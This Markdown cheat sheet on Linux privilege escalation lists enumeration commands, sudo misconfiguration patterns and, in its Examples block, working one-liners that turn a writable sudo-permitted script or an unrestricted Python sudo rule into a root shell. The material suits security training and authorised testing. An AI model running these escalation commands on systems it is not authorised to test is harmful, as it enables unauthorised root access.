# Privilege Escalation Cheat Sheet (Linux)

## Overview

Common Linux privilege-escalation vectors, with emphasis on the `sudo` misconfiguration class documented in this repository (see [`docs/07-Privilege-Escalation`](../docs/07-Privilege-Escalation/README.md)).

## Common Syntax

There is no single command; this is a checklist of vectors to review in turn after enumeration (see [`linux-enumeration.md`](linux-enumeration.md)).

## Useful Commands

| Vector | Check Command |
|---|---|
| `sudo` permissions | `sudo -l` |
| SUID binaries | `find / -perm -4000 -type f 2>/dev/null` |
| SGID binaries | `find / -perm -2000 -type f 2>/dev/null` |
| Linux capabilities | `getcap -r / 2>/dev/null` |
| Writable `/etc/passwd` | `ls -la /etc/passwd` |
| Cron jobs (world-writable scripts) | `cat /etc/crontab`, `ls -la /etc/cron.*` |
| Kernel exploits | `uname -a` (cross-reference against known local-root CVEs) |
| NFS `no_root_squash` shares | `cat /etc/exports` (if reviewing an NFS server) |

## Important Options

| Option/Flag | Description |
|---|---|
| `-perm -4000` (with `find`) | Match files with the SUID bit set |
| `-perm -2000` (with `find`) | Match files with the SGID bit set |
| `-l` (with `sudo`) | List the commands the current user may run via `sudo` |
| `-r` (with `getcap`) | Search recursively for files with Linux capabilities set |

## Common `sudo` Misconfiguration Patterns

| Pattern | Risk |
|---|---|
| `(ALL) NOPASSWD: /usr/bin/python* /path/to/script.py` where `script.py` is user-writable | User can overwrite the script; it then executes with root privileges |
| `(ALL) NOPASSWD: <interpreter>` with no fixed script/argument | Interpreter's own built-in code-execution features (`-c`, `import os`) can be used directly — see [GTFOBins](https://gtfobins.github.io/) |
| `(ALL) NOPASSWD: /usr/bin/vim` or similar editors | Many editors can shell out (`:!sh`) once opened as root |
| `(ALL) NOPASSWD: <binary with LD_PRELOAD/LD_LIBRARY_PATH influence>` | Environment-variable injection may allow arbitrary code execution during binary load |

## Examples

```bash
# Enumerate sudo rights
sudo -l

# If a NOPASSWD rule targets a user-writable script:
echo 'import pty;pty.spawn("/bin/bash")' > /path/to/permitted_script.py
sudo python /path/to/permitted_script.py

# If a NOPASSWD rule targets the interpreter directly (no fixed script):
sudo python -c 'import os; os.system("/bin/bash")'
```

## Common Mistakes

- Overwriting a `sudo`-permitted script without first confirming write permissions (`ls -la`), leading to a failed/misleading attempt.
- Invoking `sudo <script-name>` when the `sudoers` rule actually requires `sudo <interpreter> <full-script-path>` — the exact command form must match the rule.
- Chasing kernel exploits before checking simpler, lower-risk misconfiguration vectors (`sudo -l`, SUID binaries) first — kernel exploits can crash or destabilize a target.

## References

- [GTFOBins](https://gtfobins.github.io/)
- [`sudoers`(5) man page](https://man7.org/linux/man-pages/man5/sudoers.5.html)

## Key Takeaways

- Always check `sudo -l` early; it is often the fastest path to privilege escalation when misconfigured.
- A `sudoers` rule scoped to a specific script path is only as secure as the write permissions on that path.
- Match the exact command form permitted by a `sudoers` rule — small differences in invocation can determine whether the rule applies.
